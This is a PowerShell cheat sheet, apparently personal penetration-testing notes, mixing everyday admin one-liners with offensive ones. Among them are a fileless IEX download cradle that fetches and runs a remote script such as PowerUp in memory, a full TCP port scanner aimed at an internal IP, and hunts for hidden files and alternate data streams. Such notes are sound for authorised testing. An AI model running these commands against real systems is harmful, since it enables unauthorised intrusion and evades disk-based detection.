# PowerShell Conveniences

### Switches

`-NoExit` - Keeps ps window open; useful for debugging macros that are ran when a document is open

### Commands

Gets installed software, version, and install date.
```PowerShell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
```

Web requests (if one doesnt work, try the other). PowerUp!
```PowerShell
Invoke-WebRequest -Uri <target uri> -Method Get -Outfile <whatevs>.ps1 #IWR
powershell IEX(New-Object Net.Webclient).downloadString("<target uri>") #Invoke-Expression
#IEX if you want to execute without touching the disk
```

"which" nix-style output.
```powershell
Get-Command <your command> | Select-Object -ExpandProperty Definition
```

"grep"-like with x number of lines before or after.
```powershell
<some_cmd> | Select-String -Pattern "whatever" -Context 2,4
# print 2 lines before "whatever" and 4 lines after "whatever" (including "whatever")
```

sort uniq
```powershell
Get-Content file.txt | Sort-Object -unique
```
Find a file recursively
```powershell
gci -Path V:\Myfolder -Filter filename.ext -Recurse -ErrorAction SilentlyContinue -Force
```
Find a string within a file recursively
```powershell
ls -recurse | Select-String "google" | Select Path, LineNumber | Format-List
#alternatively
ls c:\temp\searchfolder -recurse | Select-String "google" | Select Path, LineNumber | Format-List
```
Get FQDN
```powershell
[System.Net.Dns]::GetHostByName($env:computerName)
```
Search for hidden files in a dir
```powershell
gci -recurse -Hidden -ErrorAction SilentlyContinue
```
copy files of one type from a share to your local machine, recursively
```powershell
 gci z:\ -Recurse -Filter *.xml | Copy -Destination C:\path\to\dir
 ```
wc -c equivalent
```powershell
echo "hash" | Measure-Object -Character
```
search current dir recursively for alternate data streams
```powershell
Get-ChildItem -recurse | ForEach { Get-Item $_.FullName -stream * } | Where stream -ne ':$DATA'
```
get data from ADS's found with the above cmd
```powershell
Get-Content -Path '.\Debug Mode filename.ext' -stream stream-name
```
port scanner
```powershell
1..65535 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("172.16.2.5",$_)) "Port $_ is open" } 2>$null
```
